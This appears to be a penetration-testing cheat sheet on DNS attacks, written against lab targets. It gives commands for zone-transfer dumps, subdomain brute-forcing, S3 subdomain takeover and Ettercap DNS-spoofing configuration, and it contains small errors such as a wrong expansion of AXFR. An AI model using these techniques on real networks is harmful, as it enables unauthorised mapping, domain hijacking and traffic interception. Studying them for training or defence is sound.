# 🛰️ DNS (Domain Name System) Attack Cheat Sheet

> [!info] 🧠 What is DNS?
> 
> Bash
> 
> ```
> Application layer protocol used to resolve human-readable domain names into numerical IP addresses
> ```
> 
> 💡 Allows administrators to:
> 
> - Map logical server functions (Web, Mail, Database nodes) to explicit infrastructure routing destinations.
>     
> - Organize corporate assets cleanly under central administrative namespaces (DNS Zones).
>     
> - Handle distributed application requests dynamically across internal and external network zones.
>     
> 
> ✔ Common in:
> 
> - Active Directory domains, internet-facing corporate portfolios, and internal perimeter networks.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Client Request (Domain Resolution Query) ↔ DNS Server (Database Mapping Lookup)
> ```
> 
> 💡 Key Ports:
> 
> - **UDP 53** → Standard resolution engine channel (Used by default for small, fast packet lookups).
>     
> - **TCP 53** → Data fallback channel (Used for heavy payloads exceeding standard packet margins, such as Zone Transfers).
>     
> 
> ✔ Think of it as **the master phone directory of the network infrastructure, translating plain-text aliases into raw physical routing instructions**.

# 🌳 Structure: Navigation & Record Replication

> [!info] 📚 DNS Namespace Layout
> 
> Bash
> 
> ```
> A     # Maps a domain name directly to an IPv4 address string
> CNAME # Canonical Name; creates an alias pointer that maps one domain handle to another domain
> NS    # Name Server; identifies the authoritative DNS server managing a specific zone profile
> ```
> 
> 💡 Function:
> 
> - Structures how external users resolve hosted services and provides infrastructure visibility to the public network.
>     

> [!tip] 📥 Zone Replication
> 
> Bash
> 
> ```
> AXFR # Asynchronous Full Transfer Zone command used to replicate a complete DNS database to a secondary server
> ```
> 
> 💡 Logic:
> 
> - Attacks center on exploiting poor access controls to dump the master database blueprint, claiming dangling third-party cloud connections, or poisoning cache files to hijack active traffic streams.
>     

# 🔐 Access Methods

|**Authentication Type**|**Credentials Required**|**Risk Level**|**Notes**|
|---|---|---|---|
|**Unrestricted Zone Transfer**|None (Anonymous Query Request)|**HIGH**|Misconfigured access list; allows anonymous actors to map out the entire domain zone database|
|**Dangling CNAME Mapping**|None (Relies on cloud asset registration)|**MEDIUM**|Leads to Subdomain Takeover; happens when local DNS records point to expired cloud targets|
|**Inbound Record Poisoning**|None (Exploits local broadcast/MITM paths)|**CRITICAL**|Forces target machines to resolve legitimate brand domains to an attacker-controlled endpoint|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Key Enumeration Tools
> 
> Bash
> 
> ```
> # 1. Fingerprint the active DNS daemon version and default scripts via Nmap
> sudo nmap -p 53 -Pn -sV -sC 10.10.110.213
> 
> # 2. Request an anonymous complete database dump via dig
> dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
> 
> # 3. Automate multi-engine passive subdomain harvesting
> subfinder -d inlanefreight.com -v
> 
> # 4. Perform pure internal dictionary brute-forcing via custom resolvers
> ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
> ```
> 
> 💡 Flag breakdown:
> 
> - `AXFR` invokes the full database replication packet call over TCP port 53.
>     
> - `-r ./resolvers.txt` passes trusted internal DNS server addresses to prevent blind spots when your attack box lacks public internet access.
>     

> [!info] 🔍 Information Revealed
> 
> - **Server Build Vulnerabilities:** Exposes the underlying application version string (e.g., `ISC BIND 9.11.3`), pointing directly to potential software CVE exploits.
>     
> - **Internal Perimeter Maps:** Discloses hidden target subdomains (`admin.`, `hr.`, `support.`) along with their direct IP addresses without generating loud alert traffic.
>     

# ⚠️ Common Misconfigurations

> [!danger] 🔓 Unrestricted Transfer Policies & Orphaned Alias Records
> 
> Bash
> 
> ```
> Name Server Policy: Allow-Transfer set to 'any' or missing IP restrictions
> DNS Database State: CNAME maps a live subdomain to an expired or deleted AWS S3 bucket name
> ```
> 
> 💡 Impact:
> 
> - **Complete Namespace Exposure:** Grants any remote user the capability to read the internal zone blueprint, drastically expanding the target's attack surface.
>     
> - **Subdomain Takeover Exposure:** Leaves the organization vulnerable to identity spoofing, as outside actors can register the matching asset name on the cloud platform to host malicious code under the corporate brand.
>     

# 💥 Protocol-Specific Attacks

> [!warning] ⚙️ Exploiting Anonymous AXFR Transfers
> 
> Bash
> 
> ```
> dig AXFR @10.129.110.213 inlanefrieght.htb
> ```
> 
> 💡 Impact:
> 
> - Extracts the entire structure of subdomains and zone records in a single query loop.
>     
> - Bypasses perimeter defense blocks by pulling full network node data without launching aggressive network sweeps.
>     

> [!danger] 🎯 Subdomain Takeover Execution
> 
> Bash
> 
> ```
> # 1. Enumerate the live CNAME pointer structure
> host support.inlanefreight.com
> # Returns: support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
> 
> # 2. Identify the cloud endpoint registration fault
> Browser Check -> Returns XML: "NoSuchBucket" (The bucket 'inlanefreight' does not exist)
> ```
> 
> 💡 Risk:
> 
> - Allows an attacker to spin up a matching bucket name inside their personal cloud console to claim full control over the corporate subdomain path.
>     
> - Evades traditional defensive blacklists since all payload traffic routes through a completely legitimate corporate domain name.
>     

> [!danger] 🔑 Local Network DNS Cache Poisoning (Ettercap)
> 
> Bash
> 
> ```
> # 1. Map target domains to your attack payload IP inside /etc/ettercap/etter.dns
> inlanefreight.com    A    192.168.225.110
> *.inlanefreight.com  A    192.168.225.110
> 
> # 2. Engage Ettercap, establish MITM targets, and activate the 'dns_spoof' plugin
> ```
> 
> 💡 Risk:
> 
> - Intercepts active network resolution requests to feed the victim machine forged IP mappings.
>     
> - Diverts standard web browsers or ping utilities straight to a malicious tracking server without altering the user's intended target configuration.
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Run Nmap across port 53 to fingerprint the running DNS software package and identify active configurations.
> 2. Issue a direct 'dig AXFR' command against discovered name servers to check for open zone transfer leaks.
> 3. If transfers are blocked, launch 'subfinder' and 'subbrute' to build an asset profile map of the subdomains.
> 4. Audit the gathered subdomains with 'host' to look for CNAME pointers linked to cloud services.
> 5. Review web responses for cloud error codes (e.g., 'NoSuchBucket') to execute an immediate subdomain takeover.
> 6. In LAN/Pivoted environments, implement Ettercap 'dns_spoof' routing parameters to manipulate and capture internal corporate traffic.
> ```
> 
> 💡 Always double-check your target domain strings when executing zone queries to ensure formatting issues don't generate false negative results.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> Zone Transfer (AXFR) → Stealing a corporate office's complete internal master directory list
> Subdomain Takeover   → Claiming a corporate storefront space because the tenant forgot to renew their lease
> DNS Cache Poisoning  → Changing the names on a highway road sign to divert traffic into a trap
> CNAME Record         → A mail forwarding sticker directing incoming couriers to a secondary package depot
> ```
> 
> 💡 If you manipulate or extract data from the DNS core layer, you control the underlying map of the entire organization. Every downstream application relies on this visibility to function securely.